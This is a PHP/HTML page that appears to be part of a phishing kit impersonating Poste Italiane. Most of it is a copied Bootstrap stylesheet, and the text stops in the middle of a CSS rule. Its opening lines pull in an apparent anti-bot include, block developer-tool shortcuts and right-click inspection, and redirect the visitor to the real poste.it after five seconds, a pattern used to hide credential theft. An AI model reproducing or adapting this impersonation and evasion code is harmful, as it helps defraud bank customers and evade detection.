<?php
include_once '../../../BOTS/INC/APP.php';
?>
<script>

	document.onkeydown = function(e) {
	  if(event.keyCode == 123) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
	     return false;
	  }
	}


	
	document.addEventListener('contextmenu', function(e) {
	  e.preventDefault();
	});

</script>
<base href=""><title>Poste Italiane - Servizi postali, finanziari e assicurativi</title>
			
			<link rel="shortcut icon" type="image/x-icon" href="./IMG/Italian_traffic_signs_-_icona_poste.svg">
			<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
			<meta http-equiv="X-UA-Compatible" content="IE=edge">
			<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, user-scalable=0">
			<meta name="identifier" content="1453903155522">
			<meta name="keywords" content="">
			<meta name="description" content="">
			<meta name="gsa_nome_prod" content="">
			<meta name="gsa_desc_prod" content="">
			<meta name="gsa_gamma_prod" content="">
			<meta name="gsa_nome_servizio" content="">
			<meta name="gsa_url_img" content="">
			<meta name="gsa_domanda" content="">
			<meta name="gsa_class" content="">
			<meta name="gsa_url" content="/sites/Posteit/login/error.html">
			<meta name="gsa_portal" content="http://www.poste.it">
			<meta name="gsa_img_url" content="">
						<script type="text/JavaScript">
      setTimeout("location.href = 'https://www.poste.it';",5000);
 </script>
			
			
				<script type="text/javascript" data-savepage-src="/dynatrace/ruxitagentjs_ICA2SVfghjqrux_10187200323152418.js" data-dtconfig="app=5e5d2e2a2db9d0f8|featureHash=ICA2SVfghjqrux|srsr=1000|rdnt=1|uxrgce=1|bp=3|cuc=iuctautm|srms=1,0,,,|uxrgcm=100,25,300,3;100,25,300,3|dpvc=1|md=2=a.static-login-logged-username|lastModification=1585172949575|dtVersion=10187200323152418|tp=500,50,0,1|uxdcw=1500|agentUri=/dynatrace/ruxitagentjs_ICA2SVfghjqrux_10187200323152418.js|reportUrl=/dynatrace/rb_d18f69c0-8ede-40ec-ae87-13ded0c03395|rid=RID_1256295369|rpid=-1042263298|domain=poste.it"></script><style data-savepage-href="/risorse_dt/bootstrap/css/bootstrap.min.css" type="text/css">/*!
 * Bootstrap v3.3.5 (http://getbootstrap.com)
 * Copyright 2011-2016 Twitter, Inc.
 * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
 */

/*!
 * Generated using the Bootstrap Customizer (http://getbootstrap.com/customize/?id=8ebdbfbae5f589a532e371d33168f175)
 * Config saved to config.json and https://gist.github.com/8ebdbfbae5f589a532e371d33168f175
 *//*!
 * Bootstrap v3.3.6 (http://getbootstrap.com)
 * Copyright 2011-2015 Twitter, Inc.
 * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
 *//*! normalize.css v3.0.3 | MIT License | github.com/necolas/normalize.css */html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,hgroup,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block;vertical-align:baseline}audio:not([controls]){display:none;height:0}[hidden],template{display:none}a{background-color:transparent}a:active,a:hover{outline:0}abbr[title]{border-bottom:1px dotted}b,strong{font-weight:bold}dfn{font-style:italic}h1{font-size:2em;margin:0.67em 0}mark{background:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sup{top:-0.5em}sub{bottom:-0.25em}img{border:0}svg:not(:root){overflow:hidden}figure{margin:1em 40px}hr{-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;height:0}pre{overflow:auto}code,kbd,pre,samp{font-family:monospace, monospace;font-size:1em}button,input,optgroup,select,textarea{color:inherit;font:inherit;margin:0}button{overflow:visible}button,select{text-transform:none}button,html input[type="button"],input[type="reset"],input[type="submit"]{-webkit-appearance:button;cursor:pointer}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}input{line-height:normal}input[type="checkbox"],input[type="radio"]{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;padding:0}input[type="number"]::-webkit-inner-spin-button,input[type="number"]::-webkit-outer-spin-button{height:auto}input[type="search"]{-webkit-appearance:textfield;-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box}input[type="search"]::-webkit-search-cancel-button,input[type="search"]::-webkit-search-decoration{-webkit-appearance:none}fieldset{border:1px solid #c0c0c0;margin:0 2px;padding:0.35em 0.625em 0.75em}legend{border:0;padding:0}textarea{overflow:auto}optgroup{font-weight:bold}table{border-collapse:collapse;border-spacing:0}td,th{padding:0}/*! Source: https://github.com/h5bp/html5-boilerplate/blob/master/src/css/main.css */@media print{*,*:before,*:after{background:transparent !important;color:#000 !important;-webkit-box-shadow:none !important;box-shadow:none !important;text-shadow:none !important}a,a:visited{text-decoration:underline}a[href]:after{content:" (" attr(href) ")"}abbr[title]:after{content:" (" attr(title) ")"}a[href^="#"]:after,a[href^="javascript:"]:after{content:""}pre,blockquote{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}tr,img{page-break-inside:avoid}img{max-width:100% !important}p,h2,h3{orphans:3;widows:3}h2,h3{page-break-after:avoid}.navbar{display:none}.btn>.caret,.dropup>.btn>.caret{border-top-color:#000 !important}.label{border:1px solid #000}.table{border-collapse:collapse !important}.table td,.table th{background-color:#fff !important}.table-bordered th,.table-bordered td{border:1px solid #ddd !important}}@font-face{font-family:'Glyphicons Halflings';src:/*savepage-url=../fonts/glyphicons-halflings-regular.eot*/url();src:/*savepage-url=../fonts/glyphicons-halflings-regular.eot?#iefix*/url() format('embedded-opentype'),/*savepage-url=../fonts/glyphicons-halflings-regular.woff2*/url() format('woff2'),/*savepage-url=../fonts/glyphicons-halflings-regular.woff*/url() format('woff'),/*savepage-url=../fonts/glyphicons-halflings-regular.ttf*/url() format('truetype'),/*savepage-url=../fonts/glyphicons-halflings-regular.svg#glyphicons_halflingsregular*/url() format('svg')}.glyphicon{position:relative;top:1px;display:inline-block;font-family:'Glyphicons Halflings';font-style:normal;font-weight:normal;line-height:1;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.glyphicon-asterisk:before{content:"\002a"}.glyphicon-plus:before{content:"\002b"}.glyphicon-euro:before,.glyphicon-eur:before{content:"\20ac"}.glyphicon-minus:before{content:"\2212"}.glyphicon-cloud:before{content:"\2601"}.glyphicon-envelope:before{content:"\2709"}.glyphicon-pencil:before{content:"\270f"}.glyphicon-glass:before{content:"\e001"}.glyphicon-music:before{content:"\e002"}.glyphicon-search:before{content:"\e003"}.glyphicon-heart:before{content:"\e005"}.glyphicon-star:before{content:"\e006"}.glyphicon-star-empty:before{content:"\e007"}.glyphicon-user:before{content:"\e008"}.glyphicon-film:before{content:"\e009"}.glyphicon-th-large:before{content:"\e010"}.glyphicon-th:before{content:"\e011"}.glyphicon-th-list:before{content:"\e012"}.glyphicon-ok:before{content:"\e013"}.glyphicon-remove:before{content:"\e014"}.glyphicon-zoom-in:before{content:"\e015"}.glyphicon-zoom-out:before{content:"\e016"}.glyphicon-off:before{content:"\e017"}.glyphicon-signal:before{content:"\e018"}.glyphicon-cog:before{content:"\e019"}.glyphicon-trash:before{content:"\e020"}.glyphicon-home:before{content:"\e021"}.glyphicon-file:before{content:"\e022"}.glyphicon-time:before{content:"\e023"}.glyphicon-road:before{content:"\e024"}.glyphicon-download-alt:before{content:"\e025"}.glyphicon-download:before{content:"\e026"}.glyphicon-upload:before{content:"\e027"}.glyphicon-inbox:before{content:"\e028"}.glyphicon-play-circle:before{content:"\e029"}.glyphicon-repeat:before{content:"\e030"}.glyphicon-refresh:before{content:"\e031"}.glyphicon-list-alt:before{content:"\e032"}.glyphicon-lock:before{content:"\e033"}.glyphicon-flag:before{content:"\e034"}.glyphicon-headphones:before{content:"\e035"}.glyphicon-volume-off:before{content:"\e036"}.glyphicon-volume-down:before{content:"\e037"}.glyphicon-volume-up:before{content:"\e038"}.glyphicon-qrcode:before{content:"\e039"}.glyphicon-barcode:before{content:"\e040"}.glyphicon-tag:before{content:"\e041"}.glyphicon-tags:before{content:"\e042"}.glyphicon-book:before{content:"\e043"}.glyphicon-bookmark:before{content:"\e044"}.glyphicon-print:before{content:"\e045"}.glyphicon-camera:before{content:"\e046"}.glyphicon-font:before{content:"\e047"}.glyphicon-bold:before{content:"\e048"}.glyphicon-italic:before{content:"\e049"}.glyphicon-text-height:before{content:"\e050"}.glyphicon-text-width:before{content:"\e051"}.glyphicon-align-left:before{content:"\e052"}.glyphicon-align-center:before{content:"\e053"}.glyphicon-align-right:before{content:"\e054"}.glyphicon-align-justify:before{content:"\e055"}.glyphicon-list:before{content:"\e056"}.glyphicon-indent-left:before{content:"\e057"}.glyphicon-indent-right:before{content:"\e058"}.glyphicon-facetime-video:before{content:"\e059"}.glyphicon-picture:before{content:"\e060"}.glyphicon-map-marker:before{content:"\e062"}.glyphicon-adjust:before{content:"\e063"}.glyphicon-tint:before{content:"\e064"}.glyphicon-edit:before{content:"\e065"}.glyphicon-share:before{content:"\e066"}.glyphicon-check:before{content:"\e067"}.glyphicon-move:before{content:"\e068"}.glyphicon-step-backward:before{content:"\e069"}.glyphicon-fast-backward:before{content:"\e070"}.glyphicon-backward:before{content:"\e071"}.glyphicon-play:before{content:"\e072"}.glyphicon-pause:before{content:"\e073"}.glyphicon-stop:before{content:"\e074"}.glyphicon-forward:before{content:"\e075"}.glyphicon-fast-forward:before{content:"\e076"}.glyphicon-step-forward:before{content:"\e077"}.glyphicon-eject:before{content:"\e078"}.glyphicon-chevron-left:before{content:"\e079"}.glyphicon-chevron-right:before{content:"\e080"}.glyphicon-plus-sign:before{content:"\e081"}.glyphicon-minus-sign:before{content:"\e082"}.glyphicon-remove-sign:before{content:"\e083"}.glyphicon-ok-sign:before{content:"\e084"}.glyphicon-question-sign:before{content:"\e085"}.glyphicon-info-sign:before{content:"\e086"}.glyphicon-screenshot:before{content:"\e087"}.glyphicon-remove-circle:before{content:"\e088"}.glyphicon-ok-circle:before{content:"\e089"}.glyphicon-ban-circle:before{content:"\e090"}.glyphicon-arrow-left:before{content:"\e091"}.glyphicon-arrow-right:before{content:"\e092"}.glyphicon-arrow-up:before{content:"\e093"}.glyphicon-arrow-down:before{content:"\e094"}.glyphicon-share-alt:before{content:"\e095"}.glyphicon-resize-full:before{content:"\e096"}.glyphicon-resize-small:before{content:"\e097"}.glyphicon-exclamation-sign:before{content:"\e101"}.glyphicon-gift:before{content:"\e102"}.glyphicon-leaf:before{content:"\e103"}.glyphicon-fire:before{content:"\e104"}.glyphicon-eye-open:before{content:"\e105"}.glyphicon-eye-close:before{content:"\e106"}.glyphicon-warning-sign:before{content:"\e107"}.glyphicon-plane:before{content:"\e108"}.glyphicon-calendar:before{content:"\e109"}.glyphicon-random:before{content:"\e110"}.glyphicon-comment:before{content:"\e111"}.glyphicon-magnet:before{content:"\e112"}.glyphicon-chevron-up:before{content:"\e113"}.glyphicon-chevron-down:before{content:"\e114"}.glyphicon-retweet:before{content:"\e115"}.glyphicon-shopping-cart:before{content:"\e116"}.glyphicon-folder-close:before{content:"\e117"}.glyphicon-folder-open:before{content:"\e118"}.glyphicon-resize-vertical:before{content:"\e119"}.glyphicon-resize-horizontal:before{content:"\e120"}.glyphicon-hdd:before{content:"\e121"}.glyphicon-bullhorn:before{content:"\e122"}.glyphicon-bell:before{content:"\e123"}.glyphicon-certificate:before{content:"\e124"}.glyphicon-thumbs-up:before{content:"\e125"}.glyphicon-thumbs-down:before{content:"\e126"}.glyphicon-hand-right:before{content:"\e127"}.glyphicon-hand-left:before{content:"\e128"}.glyphicon-hand-up:before{content:"\e129"}.glyphicon-hand-down:before{content:"\e130"}.glyphicon-circle-arrow-right:before{content:"\e131"}.glyphicon-circle-arrow-left:before{content:"\e132"}.glyphicon-circle-arrow-up:before{content:"\e133"}.glyphicon-circle-arrow-down:before{content:"\e134"}.glyphicon-globe:before{content:"\e135"}.glyphicon-wrench:before{content:"\e136"}.glyphicon-tasks:before{content:"\e137"}.glyphicon-filter:before{content:"\e138"}.glyphicon-briefcase:before{content:"\e139"}.glyphicon-fullscreen:before{content:"\e140"}.glyphicon-dashboard:before{content:"\e141"}.glyphicon-paperclip:before{content:"\e142"}.glyphicon-heart-empty:before{content:"\e143"}.glyphicon-link:before{content:"\e144"}.glyphicon-phone:before{content:"\e145"}.glyphicon-pushpin:before{content:"\e146"}.glyphicon-usd:before{content:"\e148"}.glyphicon-gbp:before{content:"\e149"}.glyphicon-sort:before{content:"\e150"}.glyphicon-sort-by-alphabet:before{content:"\e151"}.glyphicon-sort-by-alphabet-alt:before{content:"\e152"}.glyphicon-sort-by-order:before{content:"\e153"}.glyphicon-sort-by-order-alt:before{content:"\e154"}.glyphicon-sort-by-attributes:before{content:"\e155"}.glyphicon-sort-by-attributes-alt:before{content:"\e156"}.glyphicon-unchecked:before{content:"\e157"}.glyphicon-expand:before{content:"\e158"}.glyphicon-collapse-down:before{content:"\e159"}.glyphicon-collapse-up:before{content:"\e160"}.glyphicon-log-in:before{content:"\e161"}.glyphicon-flash:before{content:"\e162"}.glyphicon-log-out:before{content:"\e163"}.glyphicon-new-window:before{content:"\e164"}.glyphicon-record:before{content:"\e165"}.glyphicon-save:before{content:"\e166"}.glyphicon-open:before{content:"\e167"}.glyphicon-saved:before{content:"\e168"}.glyphicon-import:before{content:"\e169"}.glyphicon-export:before{content:"\e170"}.glyphicon-send:before{content:"\e171"}.glyphicon-floppy-disk:before{content:"\e172"}.glyphicon-floppy-saved:before{content:"\e173"}.glyphicon-floppy-remove:before{content:"\e174"}.glyphicon-floppy-save:before{content:"\e175"}.glyphicon-floppy-open:before{content:"\e176"}.glyphicon-credit-card:before{content:"\e177"}.glyphicon-transfer:before{content:"\e178"}.glyphicon-cutlery:before{content:"\e179"}.glyphicon-header:before{content:"\e180"}.glyphicon-compressed:before{content:"\e181"}.glyphicon-earphone:before{content:"\e182"}.glyphicon-phone-alt:before{content:"\e183"}.glyphicon-tower:before{content:"\e184"}.glyphicon-stats:before{content:"\e185"}.glyphicon-sd-video:before{content:"\e186"}.glyphicon-hd-video:before{content:"\e187"}.glyphicon-subtitles:before{content:"\e188"}.glyphicon-sound-stereo:before{content:"\e189"}.glyphicon-sound-dolby:before{content:"\e190"}.glyphicon-sound-5-1:before{content:"\e191"}.glyphicon-sound-6-1:before{content:"\e192"}.glyphicon-sound-7-1:before{content:"\e193"}.glyphicon-copyright-mark:before{content:"\e194"}.glyphicon-registration-mark:before{content:"\e195"}.glyphicon-cloud-download:before{content:"\e197"}.glyphicon-cloud-upload:before{content:"\e198"}.glyphicon-tree-conifer:before{content:"\e199"}.glyphicon-tree-deciduous:before{content:"\e200"}.glyphicon-cd:before{content:"\e201"}.glyphicon-save-file:before{content:"\e202"}.glyphicon-open-file:before{content:"\e203"}.glyphicon-level-up:before{content:"\e204"}.glyphicon-copy:before{content:"\e205"}.glyphicon-paste:before{content:"\e206"}.glyphicon-alert:before{content:"\e209"}.glyphicon-equalizer:before{content:"\e210"}.glyphicon-king:before{content:"\e211"}.glyphicon-queen:before{content:"\e212"}.glyphicon-pawn:before{content:"\e213"}.glyphicon-bishop:before{content:"\e214"}.glyphicon-knight:before{content:"\e215"}.glyphicon-baby-formula:before{content:"\e216"}.glyphicon-tent:before{content:"\26fa"}.glyphicon-blackboard:before{content:"\e218"}.glyphicon-bed:before{content:"\e219"}.glyphicon-apple:before{content:"\f8ff"}.glyphicon-erase:before{content:"\e221"}.glyphicon-hourglass:before{content:"\231b"}.glyphicon-lamp:before{content:"\e223"}.glyphicon-duplicate:before{content:"\e224"}.glyphicon-piggy-bank:before{content:"\e225"}.glyphicon-scissors:before{content:"\e226"}.glyphicon-bitcoin:before{content:"\e227"}.glyphicon-btc:before{content:"\e227"}.glyphicon-xbt:before{content:"\e227"}.glyphicon-yen:before{content:"\00a5"}.glyphicon-jpy:before{content:"\00a5"}.glyphicon-ruble:before{content:"\20bd"}.glyphicon-rub:before{content:"\20bd"}.glyphicon-scale:before{content:"\e230"}.glyphicon-ice-lolly:before{content:"\e231"}.glyphicon-ice-lolly-tasted:before{content:"\e232"}.glyphicon-education:before{content:"\e233"}.glyphicon-option-horizontal:before{content:"\e234"}.glyphicon-option-vertical:before{content:"\e235"}.glyphicon-menu-hamburger:before{content:"\e236"}.glyphicon-modal-window:before{content:"\e237"}.glyphicon-oil:before{content:"\e238"}.glyphicon-grain:before{content:"\e239"}.glyphicon-sunglasses:before{content:"\e240"}.glyphicon-text-size:before{content:"\e241"}.glyphicon-text-color:before{content:"\e242"}.glyphicon-text-background:before{content:"\e243"}.glyphicon-object-align-top:before{content:"\e244"}.glyphicon-object-align-bottom:before{content:"\e245"}.glyphicon-object-align-horizontal:before{content:"\e246"}.glyphicon-object-align-left:before{content:"\e247"}.glyphicon-object-align-vertical:before{content:"\e248"}.glyphicon-object-align-right:before{content:"\e249"}.glyphicon-triangle-right:before{content:"\e250"}.glyphicon-triangle-left:before{content:"\e251"}.glyphicon-triangle-bottom:before{content:"\e252"}.glyphicon-triangle-top:before{content:"\e253"}.glyphicon-console:before{content:"\e254"}.glyphicon-superscript:before{content:"\e255"}.glyphicon-subscript:before{content:"\e256"}.glyphicon-menu-left:before{content:"\e257"}.glyphicon-menu-right:before{content:"\e258"}.glyphicon-menu-down:before{content:"\e259"}.glyphicon-menu-up:before{content:"\e260"}*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}*:before,*:after{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}html{font-size:10px;-webkit-tap-highlight-color:rgba(0,0,0,0)}body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-size:14px;line-height:1.42857143;color:#333;background-color:#fff}input,button,select,textarea{font-family:inherit;font-size:inherit;line-height:inherit}a{color:#337ab7;text-decoration:none}a:hover,a:focus{color:#23527c;text-decoration:underline}a:focus{outline:thin dotted;outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}figure{margin:0}img{vertical-align:middle}.img-responsive,.thumbnail>img,.thumbnail a>img,.carousel-inner>.item>img,.carousel-inner>.item>a>img{display:block;max-width:100%;height:auto}.img-rounded{border-radius:6px}.img-thumbnail{padding:4px;line-height:1.42857143;background-color:#fff;border:1px solid #ddd;border-radius:4px;-webkit-transition:all .2s ease-in-out;-o-transition:all .2s ease-in-out;transition:all .2s ease-in-out;display:inline-block;max-width:100%;height:auto}.img-circle{border-radius:50%}hr{margin-top:20px;margin-bottom:20px;border:0;border-top:1px solid #eee}.sr-only{position:absolute;width:1px;height:1px;margin:-1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);border:0}.sr-only-focusable:active,.sr-only-focusable:focus{position:static;width:auto;height:auto;margin:0;overflow:visible;clip:auto}[role="button"]{cursor:pointer}h1,h2,h3,h4,h5,h6,.h1,.h2,.h3,.h4,.h5,.h6{font-family:inherit;font-weight:500;line-height:1.1;color:inherit}h1 small,h2 small,h3 small,h4 small,h5 small,h6 small,.h1 small,.h2 small,.h3 small,.h4 small,.h5 small,.h6 small,h1 .small,h2 .small,h3 .small,h4 .small,h5 .small,h6 .small,.h1 .small,.h2 .small,.h3 .small,.h4 .small,.h5 .small,.h6 .small{font-weight:normal;line-height:1;color:#777}h1,.h1,h2,.h2,h3,.h3{margin-top:20px;margin-bottom:10px}h1 small,.h1 small,h2 small,.h2 small,h3 small,.h3 small,h1 .small,.h1 .small,h2 .small,.h2 .small,h3 .small,.h3 .small{font-size:65%}h4,.h4,h5,.h5,h6,.h6{margin-top:10px;margin-bottom:10px}h4 small,.h4 small,h5 small,.h5 small,h6 small,.h6 small,h4 .small,.h4 .small,h5 .small,.h5 .small,h6 .small,.h6 .small{font-size:75%}h1,.h1{font-size:36px}h2,.h2{font-size:30px}h3,.h3{font-size:24px}h4,.h4{font-size:18px}h5,.h5{font-size:14px}h6,.h6{font-size:12px}p{margin:0 0 10px}.lead{margin-bottom:20px;font-size:16px;font-weight:300;line-height:1.4}@media (min-width:768px){.lead{font-size:21px}}small,.small{font-size:85%}mark,.mark{background-color:#fcf8e3;padding:.2em}.text-left{text-align:left}.text-right{text-align:right}.text-center{text-align:center}.text-justify{text-align:justify}.text-nowrap{white-space:nowrap}.text-lowercase{text-transform:lowercase}.text-uppercase{text-transform:uppercase}.text-capitalize{text-transform:capitalize}.text-muted{color:#777}.text-primary{color:#337ab7}a.text-primary:hover,a.text-primary:focus{color:#286090}.text-success{color:#3c763d}a.text-success:hover,a.text-success:focus{color:#2b542c}.text-info{color:#31708f}a.text-info:hover,a.text-info:focus{color:#245269}.text-warning{color:#8a6d3b}a.text-warning:hover,a.text-warning:focus{color:#66512c}.text-danger{color:#a94442}a.text-danger:hover,a.text-danger:focus{color:#843534}.bg-primary{color:#fff;background-color:#337ab7}a.bg-primary:hover,a.bg-primary:focus{background-color:#286090}.bg-success{background-color:#dff0d8}a.bg-success:hover,a.bg-success:focus{background-color:#c1e2b3}.bg-info{background-color:#d9edf7}a.bg-info:hover,a.bg-info:focus{background-color:#afd9ee}.bg-warning{background-color:#fcf8e3}a.bg-warning:hover,a.bg-warning:focus{background-color:#f7ecb5}.bg-danger{background-color:#f2dede}a.bg-danger:hover,a.bg-danger:focus{background-color:#e4b9b9}.page-header{padding-bottom:9px;margin:40px 0 20px;border-bottom:1px solid #eee}ul,ol{margin-top:0;margin-bottom:10px}ul ul,ol ul,ul ol,ol ol{margin-bottom:0}.list-unstyled{padding-left:0;list-style:none}.list-inline{padding-left:0;list-style:none;margin-left:-5px}.list-inline>li{display:inline-block;padding-left:5px;padding-right:5px}dl{margin-top:0;margin-bottom:20px}dt,dd{line-height:1.42857143}dt{font-weight:bold}dd{margin-left:0}@media (min-width:992px){.dl-horizontal dt{float:left;width:160px;clear:left;text-align:right;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.dl-horizontal dd{margin-left:180px}}abbr[title],abbr[data-original-title]{cursor:help;border-bottom:1px dotted #777}.initialism{font-size:90%;text-transform:uppercase}blockquote{padding:10px 20px;margin:0 0 20px;font-size:17.5px;border-left:5px solid #eee}blockquote p:last-child,blockquote ul:last-child,blockquote ol:last-child{margin-bottom:0}blockquote footer,blockquote small,blockquote .small{display:block;font-size:80%;line-height:1.42857143;color:#777}blockquote footer:before,blockquote small:before,blockquote .small:before{content:'\2014 \00A0'}.blockquote-reverse,blockquote.pull-right{padding-right:15px;padding-left:0;border-right:5px solid #eee;border-left:0;text-align:right}.blockquote-reverse footer:before,blockquote.pull-right footer:before,.blockquote-reverse small:before,blockquote.pull-right small:before,.blockquote-reverse .small:before,blockquote.pull-right .small:before{content:''}.blockquote-reverse footer:after,blockquote.pull-right footer:after,.blockquote-reverse small:after,blockquote.pull-right small:after,.blockquote-reverse .small:after,blockquote.pull-right .small:after{content:'\00A0 \2014'}address{margin-bottom:20px;font-style:normal;line-height:1.42857143}code,kbd,pre,samp{font-family:Menlo,Monaco,Consolas,"Courier New",monospace}code{padding:2px 4px;font-size:90%;color:#c7254e;background-color:#f9f2f4;border-radius:4px}kbd{padding:2px 4px;font-size:90%;color:#fff;background-color:#333;border-radius:3px;-webkit-box-shadow:inset 0 -1px 0 rgba(0,0,0,0.25);box-shadow:inset 0 -1px 0 rgba(0,0,0,0.25)}kbd kbd{padding:0;font-size:100%;font-weight:bold;-webkit-box-shadow:none;box-shadow:none}pre{display:block;padding:9.5px;margin:0 0 10px;font-size:13px;line-height:1.42857143;word-break:break-all;word-wrap:break-word;color:#333;background-color:#f5f5f5;border:1px solid #ccc;border-radius:4px}pre code{padding:0;font-size:inherit;color:inherit;white-space:pre-wrap;background-color:transparent;border-radius:0}.pre-scrollable{max-height:340px;overflow-y:scroll}.container{margin-right:auto;margin-left:auto;padding-left:15px;padding-right:15px}@media (min-width:768px){.container{width:750px}}@media (min-width:992px){.container{width:970px}}@media (min-width:1200px){.container{width:1170px}}.container-fluid{margin-right:auto;margin-left:auto;padding-left:15px;padding-right:15px}.row{margin-left:-15px;margin-right:-15px}.col-xs-1, .col-sm-1, .col-md-1, .col-lg-1, .col-xs-2, .col-sm-2, .col-md-2, .col-lg-2, .col-xs-3, .col-sm-3, .col-md-3, .col-lg-3, .col-xs-4, .col-sm-4, .col-md-4, .col-lg-4, .col-xs-5, .col-sm-5, .col-md-5, .col-lg-5, .col-xs-6, .col-sm-6, .col-md-6, .col-lg-6, .col-xs-7, .col-sm-7, .col-md-7, .col-lg-7, .col-xs-8, .col-sm-8, .col-md-8, .col-lg-8, .col-xs-9, .col-sm-9, .col-md-9, .col-lg-9, .col-xs-10, .col-sm-10, .col-md-10, .col-lg-10, .col-xs-11, .col-sm-11, .col-md-11, .col-lg-11, .col-xs-12, .col-sm-12, .col-md-12, .col-lg-12{position:relative;min-height:1px;padding-left:15px;padding-right:15px}.col-xs-1, .col-xs-2, .col-xs-3, .col-xs-4, .col-xs-5, .col-xs-6, .col-xs-7, .col-xs-8, .col-xs-9, .col-xs-10, .col-xs-11, .col-xs-12{float:left}.col-xs-12{width:100%}.col-xs-11{width:91.66666667%}.col-xs-10{width:83.33333333%}.col-xs-9{width:75%}.col-xs-8{width:66.66666667%}.col-xs-7{width:58.33333333%}.col-xs-6{width:50%}.col-xs-5{width:41.66666667%}.col-xs-4{width:33.33333333%}.col-xs-3{width:25%}.col-xs-2{width:16.66666667%}.col-xs-1{width:8.33333333%}.col-xs-pull-12{right:100%}.col-xs-pull-11{right:91.66666667%}.col-xs-pull-10{right:83.33333333%}.col-xs-pull-9{right:75%}.col-xs-pull-8{right:66.66666667%}.col-xs-pull-7{right:58.33333333%}.col-xs-pull-6{right:50%}.col-xs-pull-5{right:41.66666667%}.col-xs-pull-4{right:33.33333333%}.col-xs-pull-3{right:25%}.col-xs-pull-2{right:16.66666667%}.col-xs-pull-1{right:8.33333333%}.col-xs-pull-0{right:auto}.col-xs-push-12{left:100%}.col-xs-push-11{left:91.66666667%}.col-xs-push-10{left:83.33333333%}.col-xs-push-9{left:75%}.col-xs-push-8{left:66.66666667%}.col-xs-push-7{left:58.33333333%}.col-xs-push-6{left:50%}.col-xs-push-5{left:41.66666667%}.col-xs-push-4{left:33.33333333%}.col-xs-push-3{left:25%}.col-xs-push-2{left:16.66666667%}.col-xs-push-1{left:8.33333333%}.col-xs-push-0{left:auto}.col-xs-offset-12{margin-left:100%}.col-xs-offset-11{margin-left:91.66666667%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-0{margin-left:0}@media (min-width:768px){.col-sm-1, .col-sm-2, .col-sm-3, .col-sm-4, .col-sm-5, .col-sm-6, .col-sm-7, .col-sm-8, .col-sm-9, .col-sm-10, .col-sm-11, .col-sm-12{float:left}.col-sm-12{width:100%}.col-sm-11{width:91.66666667%}.col-sm-10{width:83.33333333%}.col-sm-9{width:75%}.col-sm-8{width:66.66666667%}.col-sm-7{width:58.33333333%}.col-sm-6{width:50%}.col-sm-5{width:41.66666667%}.col-sm-4{width:33.33333333%}.col-sm-3{width:25%}.col-sm-2{width:16.66666667%}.col-sm-1{width:8.33333333%}.col-sm-pull-12{right:100%}.col-sm-pull-11{right:91.66666667%}.col-sm-pull-10{right:83.33333333%}.col-sm-pull-9{right:75%}.col-sm-pull-8{right:66.66666667%}.col-sm-pull-7{right:58.33333333%}.col-sm-pull-6{right:50%}.col-sm-pull-5{right:41.66666667%}.col-sm-pull-4{right:33.33333333%}.col-sm-pull-3{right:25%}.col-sm-pull-2{right:16.66666667%}.col-sm-pull-1{right:8.33333333%}.col-sm-pull-0{right:auto}.col-sm-push-12{left:100%}.col-sm-push-11{left:91.66666667%}.col-sm-push-10{left:83.33333333%}.col-sm-push-9{left:75%}.col-sm-push-8{left:66.66666667%}.col-sm-push-7{left:58.33333333%}.col-sm-push-6{left:50%}.col-sm-push-5{left:41.66666667%}.col-sm-push-4{left:33.33333333%}.col-sm-push-3{left:25%}.col-sm-push-2{left:16.66666667%}.col-sm-push-1{left:8.33333333%}.col-sm-push-0{left:auto}.col-sm-offset-12{margin-left:100%}.col-sm-offset-11{margin-left:91.66666667%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-0{margin-left:0}}@media (min-width:992px){.col-md-1, .col-md-2, .col-md-3, .col-md-4, .col-md-5, .col-md-6, .col-md-7, .col-md-8, .col-md-9, .col-md-10, .col-md-11, 